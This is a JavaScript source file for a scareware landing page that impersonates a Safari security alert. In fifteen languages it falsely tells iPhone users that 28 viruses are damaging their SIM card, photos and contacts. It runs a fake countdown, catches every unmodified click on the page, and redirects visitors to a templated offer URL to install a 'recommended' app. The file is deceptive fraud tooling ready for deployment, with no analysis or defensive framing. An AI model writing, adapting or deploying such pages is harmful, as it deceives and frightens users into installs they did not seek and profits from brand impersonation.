const OFFER_URL = "{offer}";
const COUNTDOWN_SECONDS = 180;

const translations = {
  en: {
    title: "Safari Security Alert",
    brand: "Safari",
    heroDanger: "28 VIRUSES",
    heroTitle: " have been found on your iPhone, causing infection and damage.",
    heroCopy: "Your iPhone is infected with viruses that could soon damage your SIM card, data, photos, and contacts if not fixed immediately.",
    stepsTitle: "How to remove virus:",
    stepOne: "Tap the button below & go to App Store to Install the recommended virus removal App for free.",
    stepTwo: "Run the app to remove all viruses.",
    cta: "Remove Viruses Now"
  },
  fr: {
    title: "Alerte de sécurité Safari",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " ont été détectés sur votre iPhone, provoquant une infection et des dommages.",
    heroCopy: "Votre iPhone est infecté par des virus qui pourraient bientôt endommager votre carte SIM, vos données, vos photos et vos contacts si le problème n'est pas résolu immédiatement.",
    stepsTitle: "Comment supprimer le virus :",
    stepOne: "Appuyez sur le bouton ci-dessous et accédez à l'App Store pour installer gratuitement l'application de suppression de virus recommandée.",
    stepTwo: "Lancez l'application pour supprimer tous les virus.",
    cta: "Supprimer les virus maintenant"
  },
  "pt-PT": {
    title: "Alerta de segurança do Safari",
    brand: "Safari",
    heroDanger: "28 VÍRUS",
    heroTitle: " foram encontrados no seu iPhone, causando infeção e danos.",
    heroCopy: "O seu iPhone está infetado com vírus que podem em breve danificar o seu cartão SIM, dados, fotos e contactos se não forem removidos imediatamente.",
    stepsTitle: "Como remover o vírus:",
    stepOne: "Toque no botão abaixo e aceda à App Store para instalar gratuitamente a aplicação recomendada de remoção de vírus.",
    stepTwo: "Execute a aplicação para remover todos os vírus.",
    cta: "Remover vírus agora"
  },
  "pt-BR": {
    title: "Alerta de segurança do Safari",
    brand: "Safari",
    heroDanger: "28 VÍRUS",
    heroTitle: " foram encontrados no seu iPhone, causando infecção e danos.",
    heroCopy: "Seu iPhone está infectado com vírus que em breve podem danificar seu cartão SIM, dados, fotos e contatos se não forem removidos imediatamente.",
    stepsTitle: "Como remover o vírus:",
    stepOne: "Toque no botão abaixo e vá para a App Store para instalar gratuitamente o aplicativo recomendado de remoção de vírus.",
    stepTwo: "Execute o aplicativo para remover todos os vírus.",
    cta: "Remover vírus agora"
  },
  es: {
    title: "Alerta de seguridad de Safari",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " han sido encontrados en tu iPhone, causando infección y daños.",
    heroCopy: "Tu iPhone está infectado con virus que pronto podrían dañar tu tarjeta SIM, datos, fotos y contactos si no se solucionan de inmediato.",
    stepsTitle: "Cómo eliminar el virus:",
    stepOne: "Toca el botón de abajo y ve a la App Store para instalar gratis la aplicación recomendada de eliminación de virus.",
    stepTwo: "Ejecuta la aplicación para eliminar todos los virus.",
    cta: "Eliminar virus ahora"
  },
  "es-419": {
    title: "Alerta de seguridad de Safari",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " fueron encontrados en tu iPhone, causando infección y daños.",
    heroCopy: "Tu iPhone está infectado con virus que pronto podrían dañar tu tarjeta SIM, datos, fotos y contactos si no se soluciona de inmediato.",
    stepsTitle: "Cómo eliminar el virus:",
    stepOne: "Toca el botón de abajo y ve a la App Store para instalar gratis la aplicación recomendada para eliminar virus.",
    stepTwo: "Abre la aplicación para eliminar todos los virus.",
    cta: "Eliminar virus ahora"
  },
  da: {
    title: "Safari-sikkerhedsadvarsel",
    brand: "Safari",
    heroDanger: "28 VIRUSSER",
    heroTitle: " er blevet fundet på din iPhone og forårsager infektion og skade.",
    heroCopy: "Din iPhone er inficeret med virusser, der snart kan beskadige dit SIM-kort, dine data, billeder og kontakter, hvis det ikke løses straks.",
    stepsTitle: "Sådan fjerner du virus:",
    stepOne: "Tryk på knappen nedenfor, og gå til App Store for gratis at installere den anbefalede app til virusfjernelse.",
    stepTwo: "Kør appen for at fjerne alle virusser.",
    cta: "Fjern virusser nu"
  },
  ja: {
    title: "Safari セキュリティ警告",
    brand: "Safari",
    heroDanger: "28個のウイルス",
    heroTitle: "があなたのiPhoneで検出され、感染と損傷を引き起こしています。",
    heroCopy: "あなたのiPhoneはウイルスに感染しています。すぐに対処しないと、SIMカード、データ、写真、連絡先がまもなく損傷する可能性があります。",
    stepsTitle: "ウイルスを削除する方法:",
    stepOne: "下のボタンをタップしてApp Storeに移動し、推奨されるウイルス削除アプリを無料でインストールしてください。",
    stepTwo: "アプリを実行してすべてのウイルスを削除してください。",
    cta: "今すぐウイルスを削除"
  },
  fil: {
    title: "Babala sa Seguridad ng Safari",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " ang natagpuan sa iyong iPhone, na nagdudulot ng impeksyon at pinsala.",
    heroCopy: "Ang iyong iPhone ay nahawaan ng mga virus na maaaring makasira sa iyong SIM card, data, mga larawan, at mga contact kung hindi agad maaayos.",
    stepsTitle: "Paano alisin ang virus:",
    stepOne: "I-tap ang button sa ibaba at pumunta sa App Store para i-install nang libre ang inirerekomendang app na pang-alis ng virus.",
    stepTwo: "Patakbuhin ang app para alisin ang lahat ng virus.",
    cta: "Alisin ang mga Virus Ngayon"
  },
  de: {
    title: "Safari-Sicherheitswarnung",
    brand: "Safari",
    heroDanger: "28 VIREN",
    heroTitle: " wurden auf Ihrem iPhone gefunden und verursachen eine Infektion und Schäden.",
    heroCopy: "Ihr iPhone ist mit Viren infiziert, die bald Ihre SIM-Karte, Daten, Fotos und Kontakte beschädigen könnten, wenn das Problem nicht sofort behoben wird.",
    stepsTitle: "So entfernen Sie den Virus:",
    stepOne: "Tippen Sie auf die Schaltfläche unten und gehen Sie zum App Store, um die empfohlene App zur Virenentfernung kostenlos zu installieren.",
    stepTwo: "Starten Sie die App, um alle Viren zu entfernen.",
    cta: "Viren jetzt entfernen"
  },
  nb: {
    title: "Safari-sikkerhetsvarsel",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " er funnet på iPhone-en din og forårsaker infeksjon og skade.",
    heroCopy: "iPhone-en din er infisert med virus som snart kan skade SIM-kortet, dataene, bildene og kontaktene dine hvis det ikke løses umiddelbart.",
    stepsTitle: "Slik fjerner du virus:",
    stepOne: "Trykk på knappen nedenfor og gå til App Store for å installere den anbefalte appen for virusfjerning gratis.",
    stepTwo: "Kjør appen for å fjerne alle virus.",
    cta: "Fjern virus nå"
  },
  sv: {
    title: "Safari-säkerhetsvarning",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " har hittats på din iPhone och orsakar infektion och skada.",
    heroCopy: "Din iPhone är infekterad med virus som snart kan skada ditt SIM-kort, dina data, bilder och kontakter om det inte åtgärdas omedelbart.",
    stepsTitle: "Så här tar du bort virus:",
    stepOne: "Tryck på knappen nedan och gå till App Store för att installera den rekommenderade appen för virusborttagning gratis.",
    stepTwo: "Kör appen för att ta bort alla virus.",
    cta: "Ta bort virus nu"
  },
  it: {
    title: "Avviso di sicurezza Safari",
    brand: "Safari",
    heroDanger: "28 VIRUS",
    heroTitle: " sono stati trovati sul tuo iPhone, causando infezione e danni.",
    heroCopy: "Il tuo iPhone è infetto da virus che potrebbero presto danneggiare la scheda SIM, i dati, le foto e i contatti se non vengono rimossi immediatamente.",
    stepsTitle: "Come rimuovere il virus:",
    stepOne: "Tocca il pulsante qui sotto e vai sull'App Store per installare gratuitamente l'app consigliata per la rimozione dei virus.",
    stepTwo: "Esegui l'app per rimuovere tutti i virus.",
    cta: "Rimuovi virus ora"
  },
  nl: {
    title: "Safari-beveiligingswaarschuwing",
    brand: "Safari",
    heroDanger: "28 VIRUSSEN",
    heroTitle: " zijn gevonden op uw iPhone en veroorzaken infectie en schade.",
    heroCopy: "Uw iPhone is geïnfecteerd met virussen die binnenkort uw simkaart, gegevens, foto's en contacten kunnen beschadigen als dit niet onmiddellijk wordt opgelost.",
    stepsTitle: "Hoe het virus te verwijderen:",
    stepOne: "Tik op de onderstaande knop en ga naar de App Store om de aanbevolen app voor virusverwijdering gratis te installeren.",
    stepTwo: "Start de app om alle virussen te verwijderen.",
    cta: "Virussen nu verwijderen"
  },
  ro: {
    title: "Alertă de securitate Safari",
    brand: "Safari",
    heroDanger: "28 DE VIRUȘI",
    heroTitle: " au fost găsiți pe iPhone-ul dvs., provocând infecție și deteriorare.",
    heroCopy: "iPhone-ul dvs. este infectat cu viruși care ar putea deteriora în curând cartela SIM, datele, fotografiile și contactele dacă problema nu este remediată imediat.",
    stepsTitle: "Cum să eliminați virusul:",
    stepOne: "Atingeți butonul de mai jos și accesați App Store pentru a instala gratuit aplicația recomandată de eliminare a virușilor.",
    stepTwo: "Rulați aplicația pentru a elimina toți virușii.",
    cta: "Eliminați virușii acum"
  }
};

const compactTextSizes = {
  default: {
    "--brand-font-size": "24px",
    "--date-font-size": "18px",
    "--title-font-size": "28px",
    "--copy-font-size": "16px",
    "--timer-font-size": "30px",
    "--steps-title-font-size": "17px",
    "--steps-font-size": "16px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "19px"
  },
  min414: {
    "--brand-font-size": "26px",
    "--date-font-size": "19px",
    "--title-font-size": "30px",
    "--copy-font-size": "17px",
    "--timer-font-size": "32px",
    "--steps-title-font-size": "20px",
    "--steps-font-size": "17px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "21px"
  },
  max390: {
    "--brand-font-size": "24px",
    "--date-font-size": "17px",
    "--title-font-size": "29px",
    "--copy-font-size": "15px",
    "--timer-font-size": "29px",
    "--steps-title-font-size": "16px",
    "--steps-font-size": "15px",
    "--step-number-font-size": "12px",
    "--cta-font-size": "18px"
  },
  max375: {
    "--brand-font-size": "21px",
    "--date-font-size": "16px",
    "--title-font-size": "24px",
    "--copy-font-size": "13px",
    "--timer-font-size": "24px",
    "--steps-title-font-size": "15px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "11px",
    "--cta-font-size": "16px"
  },
  max320: {
    "--brand-font-size": "20px",
    "--date-font-size": "13px",
    "--title-font-size": "24px",
    "--copy-font-size": "14px",
    "--timer-font-size": "27px",
    "--steps-title-font-size": "17px",
    "--steps-font-size": "13px",
    "--step-number-font-size": "13px",
    "--cta-font-size": "16px"
  }
};

const localeTextSizes = {
  fr: compactTextSizes,
  "pt-PT": compactTextSizes,
  "pt-BR": compactTextSizes,
  es: compactTextSizes,
  "es-419": compactTextSizes,
  da: compactTextSizes,
  fil: compactTextSizes,
  de: compactTextSizes,
  nb: compactTextSizes,
  sv: compactTextSizes,
  it: compactTextSizes,
  nl: compactTextSizes,
  ro: compactTextSizes
};

function resolveLocale() {
  const browserLocales = Array.isArray(navigator.languages) && navigator.languages.length
    ? navigator.languages
    : [navigator.language || document.documentElement.lang || "en"];
  const supportedLocales = Object.keys(translations);

  for (const candidate of browserLocales) {
    const normalizedCandidate = candidate.toLowerCase();
    const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedCandidate);
    if (exactLocale) return exactLocale;

    const baseLocale = normalizedCandidate.split("-")[0];
    const baseMatch = supportedLocales.find((key) => key.toLowerCase() === baseLocale);
    if (baseMatch) return baseMatch;
  }

  return "en";
}

const locale = resolveLocale();
const dictionary = translations[locale] || translations.en;
let remainingSeconds = COUNTDOWN_SECONDS;
let redirected = false;

function setViewportHeight() {
  const viewportHeight = window.visualViewport
    ? window.visualViewport.height
    : window.innerHeight;

  document.documentElement.style.setProperty(
    "--app-viewport-height",
    `${Math.round(viewportHeight)}px`
  );
}

function getTextSizeBreakpoint() {
  if (window.matchMedia("(max-width: 320px)").matches) return "max320";
  if (window.matchMedia("(max-width: 375px)").matches) return "max375";
  if (window.matchMedia("(max-width: 390px)").matches) return "max390";
  if (window.matchMedia("(min-width: 414px)").matches) return "min414";

  return "default";
}

function applyLocaleTextSizes() {
  const landing = document.querySelector(".landing");
  const sizeConfig = localeTextSizes[locale];
  if (!landing || !sizeConfig) return;

  landing.dataset.locale = locale;

  const breakpoint = getTextSizeBreakpoint();
  const values = sizeConfig[breakpoint] || sizeConfig.default;

  Object.entries(values).forEach(([property, value]) => {
    landing.style.setProperty(property, value);
  });
}

function applyTranslations() {
  document.title = dictionary.title;

  document.querySelectorAll("[data-i18n]").forEach((node) => {
    const key = node.dataset.i18n;
    node.textContent = dictionary[key] || key;
  });
}

function setCurrentDate() {
  const dateNode = document.querySelector("[data-current-date]");
  if (!dateNode) return;

  const now = new Date();
  dateNode.dateTime = now.toISOString();
  dateNode.textContent = new Intl.DateTimeFormat(locale, {
    month: "long",
    day: "numeric"
  }).format(now);
}

function renderCountdown() {
  const timerNode = document.querySelector("[data-countdown]");
  if (!timerNode) return;

  const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
  const seconds = String(remainingSeconds % 60).padStart(2, "0");
  timerNode.textContent = `00:${minutes}:${seconds}`;
}

function goToOffer() {
  if (redirected) return;
  redirected = true;
  window.location.href = OFFER_URL;
}

function startCountdown() {
  renderCountdown();

  const intervalId = window.setInterval(() => {
    remainingSeconds -= 1;
    renderCountdown();

    if (remainingSeconds <= 0) {
      window.clearInterval(intervalId);
      goToOffer();
    }
  }, 1000);
}

function bindClicks() {
  const offerLink = document.querySelector("[data-offer-link]");
  if (offerLink) {
    offerLink.href = OFFER_URL;
    offerLink.addEventListener("click", (event) => {
      event.preventDefault();
      goToOffer();
    });
  }

  document.addEventListener("click", (event) => {
    const isModifiedClick = event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
    if (isModifiedClick) return;

    event.preventDefault();
    goToOffer();
  });
}

applyLocaleTextSizes();
applyTranslations();
setViewportHeight();
setCurrentDate();
startCountdown();
bindClicks();

window.addEventListener("resize", () => {
  setViewportHeight();
  applyLocaleTextSizes();
});
window.addEventListener("orientationchange", () => {
  setViewportHeight();
  applyLocaleTextSizes();
});

if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", setViewportHeight);
  window.visualViewport.addEventListener("scroll", setViewportHeight);
}
